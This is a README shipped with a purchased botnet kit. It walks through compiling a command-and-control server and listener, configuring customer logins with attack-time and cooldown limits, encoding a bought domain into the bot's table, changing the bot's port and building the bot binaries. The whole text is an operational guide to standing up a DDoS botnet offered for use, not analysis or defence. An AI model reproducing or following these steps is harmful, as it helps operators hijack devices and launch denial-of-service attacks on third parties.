Thanks for buyign....
If you buy something better HMU 

Dont skidrip / resell / leak this shit
made by franco and wicked 










REQUIREMENTS SYSTEM
- DEBIAN 10
- 8GB RAM (IF YOU ARE LOADING ALOT OF BOTS) USE TO HANDLE 80K WITH NO PROBLEM
- 1GBPS UPLINK

okay so this is setp by step how to setup botnet


step 1 (compiling the cnc)
- to compile the cnc you use this command: gcc cnc.c -o cnc -pthread
then it should have the output called cnc in the folder.

now you have to use golang 13 to be able to download and compile the listen.go
to compile use this command: go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

okay now if you succesfully compiled it open it on a screen command

ulimit -n999999; ulimit -u9999999; ./cnc 55650 1337 750
ulimit -n999999; ulimit -u9999999; ./listen

the logins.txt as you see theres an existing admin user there
the format is

username password -1 attacktime cooldowntime all 0
now if you set 0 to 1 it will be admin so for current users just use 0

-------------------------------

step 2 (compiling the bot)

- go to tools/enc.c to compile it use command: gcc enc.c -o enc

now buy a domain for the bot then do this command: ./enc string "yourdomain.com"

now there will be a hex and a number so add it on bot/table.c
TABLE_CNC_DOMAIN

now go to bot/main.c and change the bot port
go to line 329 (srv_addr.sin_port = htons(44629);)

change it to anything you like

use build.sh to compile the bot

also before running build.sh run this command: dos2unix build.sh; sh build.sh

if you dont have dox2unix install it

apt install dos2unix -y

and your setup is done.
